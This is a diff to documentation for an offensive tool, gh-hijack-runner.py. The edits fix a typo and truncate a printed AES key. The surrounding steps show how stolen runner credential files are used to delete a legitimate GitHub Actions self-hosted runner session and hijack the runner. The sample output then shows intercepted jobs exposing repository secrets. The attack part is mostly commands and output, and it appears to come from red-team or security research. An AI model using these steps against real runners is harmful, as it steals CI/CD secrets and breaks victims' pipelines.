@@ -56,7 +56,7 @@ root@9f8f6f1fdfa6:/actions-runner# cat _diag/* | grep -i session
 
 **/!\\ Deleting the current session will crash the legitimate runner /!\\**
 
-The, you can delete the current session:
+Then, you can delete the current session:
 ```sh
 $ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json --delete-session-id aab007e0-eedd-4c1b-96b4-a7c2c128c31a
 [+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a.
@@ -66,7 +66,7 @@ Finally you can hijack this runner:
 ```sh
 $ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json                                                         
 [+] Session ID: 3c88c6f7-5764-4121-b9bf-2536ee2539b7
-[+] AES key: eLN3rhf3DxJlx34TItLcpOiTVZ0boN1ZJCQutn+0j2pNmZg1MvEMqHW2D5dvpNS583tWbGtwZKRSDyYRCAm7YprWcS0+i+swcqQk8R5rlVwnwowO6GCSUDC/Ztn9e4+TVIP3PXyqMPUnEVzF1ig/2sAGONPJhwu3ia+63IEZMQ8GvSRTyfkEKDHWyKfoCPpACMqMFo4BoV+GOaXszdTkcIrmHJVa26g/wvfhOcoOU46qs+QsfAhRz/6LaWDf2CSh3WXGfpLiOJFwrroBxfPGKLSaiz9byhXw6SLmL32Ad1pVgw34gvvFY1zppfMLhJqCo1XAfINO/cbMwRRZUHewLw==
+[+] AES key: eLN3rhf3D[...]UHewLw==
 [+] New Job: init (messageId=2)
 - REPO_SECRET: repo secret
 - SUPER_SECRET: super secret password
